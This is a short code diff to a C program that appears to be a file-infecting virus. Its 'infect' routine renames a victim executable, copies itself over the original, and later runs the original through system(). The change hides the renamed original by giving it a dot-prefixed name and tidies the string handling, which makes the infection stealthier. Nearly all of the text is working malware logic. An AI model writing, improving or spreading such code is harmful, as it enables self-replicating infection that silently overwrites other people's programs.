@@ -43,8 +43,7 @@ void infect(char *fileUninfected, char *prog_name) {
     char cpQuery[50];
     char chQuery[50];
 
-    strcpy(tempName, strToken);
-    strcat(tempName, ".old");
+    snprintf(tempName, sizeof(tempName), ".%s.old", strToken);
     rename(strToken, tempName);
     snprintf(cpQuery, sizeof(cpQuery), "cp %s %s 2>/dev/null", prog_name,
              strToken);
@@ -95,6 +94,6 @@ int main(int argc, char *argv[]) {
   pg *files = fileFinder(prog_name);
   char *fileUninfected = isInfected(files);
   infect(fileUninfected, prog_name);
-  snprintf(exeQuery, sizeof(exeQuery), "./%s.old 2>/dev/null", files->main);
+  snprintf(exeQuery, sizeof(exeQuery), "./.%s.old 2>/dev/null", files->main);
   system(exeQuery);
 }
